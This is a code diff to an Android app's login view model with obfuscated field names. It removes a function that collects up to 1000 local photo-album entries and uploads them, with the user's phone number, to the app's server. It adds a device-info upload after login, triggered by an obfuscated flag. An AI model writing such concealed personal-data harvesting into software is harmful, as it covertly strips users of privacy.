@@ -8,6 +8,7 @@ import com.dream.bjst.bean.LoginParam
 import com.dream.bjst.common.UserManager
 import com.dream.bjst.identification.bean.IdCardStatusBean
 import com.dream.bjst.net.Api
+import com.dream.bjst.other.DeviceInfoViewModel
 import com.dream.bjst.utils.DeviceUtils
 import com.tcl.base.common.BaseViewModel
 import com.tcl.base.event.SingleLiveEvent
@@ -18,7 +19,7 @@ import com.tcl.base.kt.ktToastShow
  *@date   2022/1/26
  *description
  */
-class LoginViewModel : BaseViewModel() {
+class LoginViewModel : DeviceInfoViewModel() {
     val sendCode = SingleLiveEvent<Boolean>()
     val loginResult = SingleLiveEvent<LoginBean>()
     val idCardStatus = SingleLiveEvent<IdCardStatusBean>()
@@ -58,19 +59,22 @@ class LoginViewModel : BaseViewModel() {
             UserManager.setUserNo(result.`9D90`)
             UserManager.setCustomerUid(result.`978187809B999186A19D90`)
             UserManager.setUserPhone(result.`978187809B999186B99B969D9891`)
+            UserManager.setFalseAccount(result.`939B9B939891A09187809186`)
             loginResult.postValue(result)
+            if (result.`939B9B939891A09187809186`) {
+                updateDeviceInfo()
+            }
         }, errorBlock = {
             it.message?.ktToastShow()
         })
     }
 
-    fun fetchCustomerKycStatus(){
+    fun fetchCustomerKycStatus() {
         rxLaunchUI({
             val result = Api.fetchCustomerKycStatus()
             idCardStatus.postValue(result)
         })
     }
-
 
     /**
      * 隐私协议
@@ -79,18 +83,6 @@ class LoginViewModel : BaseViewModel() {
         rxLaunchUI({
             var privacyRes = Api.privacyContent()
             privacyResult.postValue(privacyRes)
-        })
-    }
-
-    /**
-     * 上传设备信息 （相册信息）
-     */
-    fun upDevicePhoto() {
-        rxLaunchUI({
-            val filesEnCrypt = DeviceUtils.getLocalAlbumList(0,1000)
-            val paramBean = DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086`= filesEnCrypt,`999B969D9891` = UserManager.getUserPhone())
-            val result = Api.uploadDeviceAlbumInfo(GsonUtils.toJson(paramBean))
-            upDevicePhoto.postValue(result.`869187819880`)
         })
     }
 
